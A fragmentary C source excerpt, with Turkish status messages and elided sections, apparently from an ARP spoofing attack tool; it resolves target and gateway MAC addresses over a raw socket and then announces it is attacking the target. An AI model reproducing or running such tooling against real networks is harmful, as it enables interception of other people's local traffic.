...
int main(int argc, char ** argv) {
	...
	if(sockfd < 0) {
		printf("\033[41m Soket Oluşturulurken Hata Oluştu\n\033[0m");
		perror("");
		return -1;
	}
	...
	printf("\n\033[42m Arayüz Detayları Alınıyor... \033[0m");
	...
	if(address_location == NULL) {
		printf("\n\033[41m Arabirim için Yerel MAC Adresi Bulunamadı !%s\033[0m");
		perror("");
		return -1;
	}
	...
	printf("\033[33m ARP Ping İsteği Hazırlanıyor... \033[0m");
	...
	printf("\033[32m Bitti \n\n\033[0m");
	printf("\033[33m Hedef Ayrıntıları Alınıyor... \n\033[0m");

	if((sendto(sockfd, arp_ping_packet, ARP_PING_LEN, 0, (struct sockaddr*)&device, sizeof(device))) < 0) {
		printf("\033[41m ARP Ping Gönderilemedi! \n\033[0m");
		perror("");
		return -1;
	}

	printf("\n\033[42m ARP Ping Başarıyla Gönderildi! \033[0m");
	printf("\033[33m Yanıt Bekleniyor... \033[0m");

	uint8_t arp_reply[1024];
	int recv_stat;

	if((recv_stat = recv(sockfd, arp_reply, sizeof(arp_reply), 0)) < 0) {
		printf("\n\033[41m Recv() Yanıt Vermedi! \033[0m");
		perror("");
		return -1;
	}
	...
	printf("\033[01;37m Hedef Ayrıntıları:\n\tIP  - %s\n\tMAC - %02x:%02x:%02x:%02x:%02x:%02x\n\n\033[0m", target_ip,
									   target_mac[0],
									   target_mac[1],
									   target_mac[2],
									   target_mac[3],
	...
	printf("\033[33m Bağlantı Ayrıntıları Alınıyor... \n\033[0m");
	...
	printf("\033[01;37m Bağlantı Ayrıntıları:\n\tIP  - %s\n\tMAC - %02x:%02x:%02x:%02x:%02x:%02x\n\n\033[0m", gateway_ip,
									   gateway_mac[0],
									   gateway_mac[1],
									   gateway_mac[2],
									   gateway_mac[3],
	...
	printf("\033[32mHedefe Saldırılıyor.. [IPTAL ETMEK ICIN CTRL-C] \n\033[?25l\033[0m");
	int sent = 1;
